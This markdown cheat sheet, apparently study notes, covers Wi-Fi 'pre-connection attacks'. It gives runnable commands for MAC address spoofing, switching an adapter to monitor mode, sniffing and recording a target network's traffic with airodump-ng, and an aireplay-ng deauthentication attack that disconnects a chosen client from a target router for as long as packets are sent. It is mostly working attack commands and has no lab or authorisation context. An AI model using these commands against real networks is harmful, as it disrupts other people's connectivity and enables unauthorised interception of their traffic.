
# Pre-connection attacks

## Change mac address

- Disable the interface
```
$ ifconfig wlan0 down
```

- Change the mac address
```
$ ifconfig wlan0 hw ether <new_mac_address>
```

- Enable the interface
```
$ ifconfig wlan0 up
```

## Change wireless mode to monitor (ifconfig method)

- Disable wireless interface (change wlan0 to the interface you want to use)
```
$ ifconfig wlan0 down
```

- Kill all processes that can interfere using the interface
```
$ airmon-ng check kill
```

- Change mode to monitor
```
$ iwconfig wlan0 mode monitor
```
if this command does not work use this alternative:
```
$ airmon-ng start wlan0
```

- Enable the interface
```
$ ifconfig wlan0 up
```

## Packet sniffing

- Change wireless adapter to monitor mode

- Listen to all wireless network (change mon0 to the interface you want to use)
```
$ airodump-ng mon0
```
This will sniff on the 2.4GHz band, if you want to sniff on all bands modify the command like this:
```
$ airodump-ng --band abg mon0
```

- Listen to a specific network
```
$ airodump-ng --bssid <target-network-bssid> --channel <target-network-channel> --write <filename> mon0
```
--write option: export result to file

## Deauthentication attack
- Deauthenticate the target machine (client-mac-addr) from the router (target-mac-addr)<br>
If is running on 5GHz add -D.<br>
Higher the number of packets is longer we keep the target disconnected<br>
(change mon0 to the inteface you want to use)
```
$ aireplay-ng --deauth <packet-number> -a <target-mac-addr> -c <client-mac-addr> mon0
```
sometimes this command can fail if airodump-ng is not running against the target network
